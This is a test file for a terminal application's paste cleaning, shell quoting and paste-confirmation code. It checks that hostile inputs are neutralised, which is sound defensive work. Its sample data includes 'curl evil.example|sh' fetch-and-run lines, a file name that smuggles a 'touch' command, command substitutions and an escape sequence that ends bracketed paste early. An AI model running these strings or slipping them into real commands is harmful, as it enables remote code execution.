// Paths typed or pasted into a terminal (src/terminal/api.ts). Run: pnpm test
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync } from "node:fs";
import { cleanPaste, pasteNeedsConfirm, pastePreview, remotePath, shellQuote, typeable } from "../../src/terminal/quote.ts";

test("pasted text can't end the bracketed paste early", () => {
  const evil = "ls\x1b[201~\ncurl evil.example|sh\n";
  assert.equal(cleanPaste(evil), "ls[201~\ncurl evil.example|sh\n");
  assert.equal(cleanPaste("a\x1b[200~b\x9b201~c\x00\x07\x7f"), "a[200~b201~c");
  // tabs, line breaks and other text stay
  assert.equal(cleanPaste("a\tb\r\nc ž 漢字 ✓"), "a\tb\r\nc ž 漢字 ✓");
});

test("names with control characters are never typed", () => {
  for (const bad of ["a\u0015curl evil|sh #", "a\u001b[201~\u0015x\r", "tab\there", "del\u007f", "c1\u009b", "nl\n"]) {
    assert.equal(typeable(bad), false);
    assert.equal(shellQuote(`/srv/${bad}`), null);
    assert.equal(remotePath("/srv", bad), null);
    assert.equal(remotePath("~", bad), null);
  }
  assert.equal(remotePath("~", ""), "~");
  assert.equal(remotePath("~/site", "a b/"), "~/'site/a b'");
});

test("quotes and backslashes sit outside the single quotes", () => {
  assert.equal(shellQuote("/var/www/site-1.2"), "/var/www/site-1.2");
  assert.equal(shellQuote("it's"), `'it'\\''s'`);
  assert.equal(shellQuote(`a\\b`), `'a'\\\\'b'`);
  assert.equal(shellQuote(""), "''");
});

const NASTY = ["My Files", "it's", `\\'; touch /tmp/kybl-term-pwned; echo \\`, "$(id) `id` \"q\" * ~", "-n", "ünï", `x\\\\'\\`];

test("sh reads every quoted name back whole", () => {
  for (const s of NASTY) {
    const out = execFileSync("/bin/sh", ["-c", `printf %s ${shellQuote(s)}`]).toString();
    assert.equal(out, s);
  }
  assert.equal(existsSync("/tmp/kybl-term-pwned"), false);
});

test("fish reads it back too (when installed)", () => {
  const fish = ["/opt/homebrew/bin/fish", "/usr/local/bin/fish", "/usr/bin/fish"].find((p) => existsSync(p));
  if (!fish) return;
  for (const s of NASTY) assert.equal(execFileSync(fish, ["-c", `printf %s ${shellQuote(s)}`]).toString(), s);
  assert.equal(existsSync("/tmp/kybl-term-pwned"), false);
});

test("a paste whose lines would run at once is asked about first", () => {
  // no bracketed paste in the shell: any line break runs what came before it
  for (const t of ["npm i foo\ncurl evil|sh\n", "ls\n", "a\rb"]) assert.equal(pasteNeedsConfirm(t, false), true, JSON.stringify(t));
  // one line without a break: no question
  assert.equal(pasteNeedsConfirm("npm i foo", false), false);
  assert.equal(pasteNeedsConfirm("npm i foo", true, true), false);
  // the bracketed flag can be set by any program's output: asked anyway, unless the user trusts it
  assert.equal(pasteNeedsConfirm("a\nb\n", true), true);
  assert.equal(pasteNeedsConfirm("a\nb\n", true, true), false);
  assert.equal(pasteNeedsConfirm("a\nb\n", false, true), true);
});

test("the paste preview shows invisible and direction characters", () => {
  assert.equal(pastePreview("ls‮ hs|live lruc"), "ls<U+202E> hs|live lruc");
  assert.equal(pastePreview("a​b﻿"), "a<U+200B>b<U+FEFF>");
  assert.equal(pastePreview("plain\ntext"), "plain\ntext");
});
